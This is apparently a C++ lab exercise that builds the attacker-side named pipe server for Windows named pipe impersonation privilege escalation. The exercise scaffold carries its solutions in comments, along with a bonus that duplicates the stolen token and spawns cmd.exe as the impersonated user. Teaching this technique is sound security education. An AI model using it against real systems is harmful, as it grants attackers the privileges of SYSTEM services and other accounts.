/*
  Exercise 01 — Named Pipe Server (Attacker Side)
  -------------------------------------------------
  Named pipe impersonation is a privilege escalation technique:
    1. An attacker-controlled process creates a named pipe.
    2. A higher-privilege process connects to it.
    3. The attacker calls ImpersonateNamedPipeClient().
    4. The attacker's thread now runs under the victim's security token.

  This exercise builds the SERVER side (attacker process).
  The client side is in ex02_named_pipe_client.cpp.

  In a real test: you'd trick a Windows service or another SYSTEM process
  to connect to your pipe via a UNC path or a coercion technique.

  In this lab: run the server first, then run the client manually.

  Tasks:
  1. Implement createPipe(pipeName) — CreateNamedPipeA with
     PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1 instance.
  2. Implement waitForConnection(hPipe) — ConnectNamedPipe (blocking).
  3. Implement impersonateClient(hPipe) — ImpersonateNamedPipeClient.
  4. Implement whoAmI() — OpenThreadToken → GetTokenInformation(TokenUser)
     → LookupAccountSid → return "DOMAIN\\username".
  5. Print the identity before and after impersonation.
  6. Optionally: DuplicateTokenEx → CreateProcessWithTokenW to spawn
     cmd.exe as the impersonated identity.

  Compile:
    g++ -std=c++17 -Wall -o server.exe ex01_named_pipe_server.cpp
  Usage:
    server.exe [pipeName]
    server.exe \\.\pipe\TestPipe
  Then in another window:
    client.exe \\.\pipe\TestPipe
*/

#include <windows.h>
#include <string>
#include <cstdio>

std::string whoAmI(bool impersonated) {
    HANDLE hToken = nullptr;
    BOOL ok = impersonated
        ? OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)
        : OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    if (!ok) return "unknown";

    DWORD sz = 0;
    GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
    std::vector<BYTE> buf(sz);
    GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz);
    TOKEN_USER* tu = (TOKEN_USER*)buf.data();

    char name[256] = {}, domain[256] = {};
    DWORD nl = sizeof(name), dl = sizeof(domain);
    SID_NAME_USE use;
    LookupAccountSidA(nullptr, tu->User.Sid, name, &nl, domain, &dl, &use);
    CloseHandle(hToken);
    return std::string(domain) + "\\" + name;
}

// ---------- TODO 1: createPipe ----------
HANDLE createPipe(const std::string& pipeName) {
    // YOUR CODE HERE:
    // return CreateNamedPipeA(
    //     pipeName.c_str(),
    //     PIPE_ACCESS_DUPLEX,
    //     PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
    //     1,     // max instances
    //     4096, 4096, 0, nullptr);
    (void)pipeName;
    return INVALID_HANDLE_VALUE;
}

// ---------- TODO 2: waitForConnection ----------
bool waitForConnection(HANDLE hPipe) {
    // YOUR CODE HERE:
    // return ConnectNamedPipe(hPipe, nullptr) || GetLastError() == ERROR_PIPE_CONNECTED;
    (void)hPipe;
    return false;
}

// ---------- TODO 3: impersonateClient ----------
bool impersonateClient(HANDLE hPipe) {
    // YOUR CODE HERE:
    // return ImpersonateNamedPipeClient(hPipe) == TRUE;
    (void)hPipe;
    return false;
}

int main(int argc, char* argv[]) {
    const char* pipeName = argc > 1 ? argv[1] : "\\\\.\\pipe\\TestImpersonation";
    printf("[*] Creating pipe: %s\n", pipeName);
    printf("[*] Running as: %s\n", whoAmI(false).c_str());

    HANDLE hPipe = createPipe(pipeName);
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] createPipe not implemented or failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Pipe created. Waiting for client...\n");

    if (!waitForConnection(hPipe)) {
        printf("[-] waitForConnection failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Client connected!\n");

    if (!impersonateClient(hPipe)) {
        printf("[-] impersonateClient failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }
    printf("[+] Impersonating client. Now running as: %s\n", whoAmI(true).c_str());

    // BONUS: spawn cmd.exe as the impersonated user
    // HANDLE hToken = nullptr;
    // OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, TRUE, &hToken);
    // HANDLE hDup = nullptr;
    // DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &hDup);
    // STARTUPINFOW si = { sizeof(si) };
    // PROCESS_INFORMATION pi = {};
    // CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe",
    //                         nullptr, 0, nullptr, nullptr, &si, &pi);
    // printf("[+] Spawned cmd.exe as impersonated user, PID=%lu\n", pi.dwProcessId);

    RevertToSelf();
    printf("[*] Reverted to self: %s\n", whoAmI(false).c_str());

    CloseHandle(hPipe);
    return 0;
}
